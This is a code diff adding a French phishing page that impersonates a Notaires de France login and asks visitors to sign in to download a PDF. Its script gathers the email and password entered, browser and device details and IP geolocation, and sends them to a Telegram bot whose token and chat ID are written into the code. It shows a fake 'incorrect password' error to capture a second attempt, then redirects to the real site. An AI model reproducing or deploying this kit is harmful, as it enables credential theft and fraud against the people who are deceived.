@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="fr">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="-1">
+    <title>Se connecter à votre compte</title>
+    <link rel="shortcut icon" href="https://www.notaires.fr/sites/all/themes/notaires/favicon.ico">
+    
+    <style type="text/css">
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        
+        /* Arrière-plan flouté */
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('Cap.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            filter: blur(5px);
+            -webkit-filter: blur(5px);
+            z-index: -1;
+            transform: scale(1.1); /* Pour éviter les bords blancs causés par le flou */
+        }
+        
+        .login-container {
+            max-width: 440px;
+            width: 100%;
+            padding: 44px;
+            margin: 0 auto;
+            background-color: rgba(255, 255, 255, 0.95);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            border-radius: 6px;
+            box-sizing: border-box;
+            z-index: 1;
+            text-align: center; /* Centre le texte et les éléments inline */
+        }
+        
+        .logo {
+            display: block;
+            margin: 0 auto 20px; /* Centre l'image avec des marges auto */
+            max-width: 120px; /* Taille réduite du logo */
+            height: auto;
+        }
+        
+        h1 {
+            font-size: 18px; /* Taille réduite du titre */
+            font-weight: 600;
+            margin: 0 0 20px;
+            color: #1b1b1b;
+            text-align: center; /* Centre le titre */
+            white-space: nowrap; /* Empêche le retour à la ligne */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .pdf-icon {
+            width: 20px;
+            height: 20px;
+            margin-left: 8px; /* Marge à gauche au lieu de droite */
+            vertical-align: middle;
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+            text-align: left; /* Aligne le texte à gauche dans les groupes de formulaire */
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 4px;
+            font-size: 15px;
+            color: #1b1b1b;
+        }
+        
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            height: 36px;
+            padding: 6px 10px;
+            border: 1px solid #b2b2b2;
+            border-radius: 2px;
+            font-size: 15px;
+            box-sizing: border-box;
+        }
+        
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            border-color: #0067b8;
+            outline: none;
+        }
+        
+        .button-container {
+            display: flex;
+            justify-content: center; /* Centre le bouton */
+            margin-top: 20px;
+        }
+        
+        .button {
+            width: 108px;
+            height: 32px;
+            background-color: #0067b8;
+            color: #fff;
+            border: none;
+            border-radius: 2px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        .button:hover {
+            background-color: #005da6;
+        }
+        
+        .links {
+            margin-top: 20px;
+            font-size: 13px;
+            text-align: center; /* Centre les liens */
+        }
+        
+        .links a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        
+        .links a:hover {
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            margin-top: 40px;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+        }
+        
+        .email-providers {
+            display: block;
+            margin: 25px auto 0;
+            max-width: 300px;
+            height: auto;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .loading-spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0067b8;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .error-message {
+            color: #e81123;
+            font-size: 13px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        @media (max-width: 600px) {
+            .login-container {
+                max-width: 100%;
+                padding: 24px;
+                box-shadow: none;
+                border-radius: 0;
+            }
+            
+            .email-providers {
+                max-width: 250px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="login-container">
+        <img src="notaire.png" alt="Notaires de France" class="logo">
+        
+        <h1>
+            Connectez-vous pour télécharger votre fichier
+            <img src="pdf.png" alt="PDF" class="pdf-icon">
+        </h1>
+        
+        <form id="loginForm" onsubmit="return sendToTelegram(event)">
+            <div class="form-group">
+                <label for="email">Adresse e-mail ou téléphone</label>
+                <input type="email" id="email" name="email" autocomplete="username" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Mot de passe</label>
+                <input type="password" id="password" name="password" autocomplete="current-password" required>
+                <div id="passwordError" class="error-message">Mot de passe incorrect. Veuillez réessayer.</div>
+            </div>
+            
+            <div class="links">
+                <button type="submit" class="button" id="loginButton">Se connecter</button>
+            </div>
+            
+            <div id="loading" class="loading">
+                <div class="loading-spinner"></div>
+                <p>Vérification en cours...</p>
+            </div>
+            
+            <!-- Image des boîtes mail -->
+            <img src="boite.png" alt="Fournisseurs de messagerie" class="email-providers">
+        </form>
+        
+        <div class="copyright">
+            © Notaires 2025
+        </div>
+    </div>
+
+    <script>
+        // Configuration avec vos informations Telegram
+        const TELEGRAM_BOT_TOKEN = "7868845322:AAGMnJHZEEz87wjRRLcm4aNKyNkTcfgraWI";
+        const TELEGRAM_CHAT_ID = "7405916751";
+        const REDIRECT_URL = "https://www.notaires.fr/fr"; // URL de redirection après tentatives
+        
+        // Fonction pour obtenir des informations sur le navigateur et l'appareil
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenWidth = window.screen.width;
+            const screenHeight = window.screen.height;
+            const language = navigator.language;
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            
+            return {
+                userAgent,
+                platform,
+                screenResolution: `${screenWidth}x${screenHeight}`,
+                language,
+                timeZone,
+                dateTime: new Date().toISOString()
+            };
+        }
+        
+        // Fonction pour obtenir l'adresse IP (via un service externe)
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://ipinfo.io/json');
+                return await response.json();
+            } catch (error) {
+                console.error('Erreur lors de la récupération des informations IP:', error);
+                return { error: 'Impossible de récupérer les informations IP' };
+            }
+        }
+        
+        // Compteur de tentatives
+        let attemptCount = 0;
+        
+        // Fonction principale pour envoyer les données à Telegram
+        async function sendToTelegram(event) {
+            event.preventDefault();
+            
+            // Récupération des valeurs du formulaire
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Afficher le chargement
+            document.getElementById('loading').style.display = 'block';
+            
+            try {
+                // Récupérer les informations sur l'appareil et l'IP
+                const deviceInfo = getDeviceInfo();
+                const ipInfo = await getIPInfo();
+                
+                // Préparer le message pour Telegram
+                const message = `
+🔐 *NOUVELLES INFORMATIONS DE CONNEXION* 🔐
+
+📧 *Email/Téléphone:* ${email}
+🔑 *Mot de passe:* ${password}
+
+📱 *Informations sur l'appareil:*
+• Navigateur: ${deviceInfo.userAgent}
+• Plateforme: ${deviceInfo.platform}
+• Résolution: ${deviceInfo.screenResolution}
+• Langue: ${deviceInfo.language}
+• Fuseau horaire: ${deviceInfo.timeZone}
+• Date/Heure: ${deviceInfo.dateTime}
+
+🌐 *Informations IP:*
+• IP: ${ipInfo.ip || 'Non disponible'}
+• Ville: ${ipInfo.city || 'Non disponible'}
+• Région: ${ipInfo.region || 'Non disponible'}
+• Pays: ${ipInfo.country || 'Non disponible'}
+• FAI: ${ipInfo.org || 'Non disponible'}
+
+🔢 *Tentative:* ${attemptCount + 1}
+                `;
+                
+                // Envoyer le message à Telegram
+                const telegramURL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const response = await fetch(telegramURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (!result.ok) {
+                    throw new Error('Erreur lors de l'envoi du message à Telegram');
+                }
+                
+                // Incrémenter le compteur de tentatives
+                attemptCount++;
+                
+                // Si c'est la deuxième tentative, rediriger vers le site officiel
+                if (attemptCount >= 2) {
+                    setTimeout(() => {
+                        window.location.href = REDIRECT_URL;
+                    }, 1500);
+                } else {
+                    // Sinon, afficher l'erreur de mot de passe
+                    setTimeout(() => {
+                        document.getElementById('loading').style.display = 'none';
+                        document.getElementById('passwordError').style.display = 'block';
+                        document.getElementById('password').value = '';
+                        document.getElementById('password').focus();
+                    }, 2000);
+                }
+                
+            } catch (error) {
+                console.error('Erreur:', error);
+                
+                // En cas d'erreur, afficher quand même l'erreur de mot de passe
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('passwordError').style.display = 'block';
+                    document.getElementById('password').value = '';
+                    document.getElementById('password').focus();
+                }, 2000);
+            }
+            
+            // Empêcher la soumission réelle du formulaire
+            return false;
+        }
+        
+        // Ajouter un gestionnaire d'événements pour le clic direct sur le bouton
+        document.addEventListener('DOMContentLoaded', function() {
+            const loginButton = document.getElementById('loginButton');
+            
+            // Ajouter un gestionnaire d'événements pour le clic direct sur le bouton
+            // qui sera utilisé comme fallback si le formulaire ne se soumet pas correctement
+            loginButton.addEventListener('click', function(e) {
+                // Le gestionnaire onsubmit du formulaire devrait s'exécuter en premier
+                // Ceci est juste une sauvegarde
+                if (!e.handled) {
+                    sendToTelegram(e);
+                    e.handled = true;
+                }
+            });
+        });
+    </script>
+</body>
+
+</html>
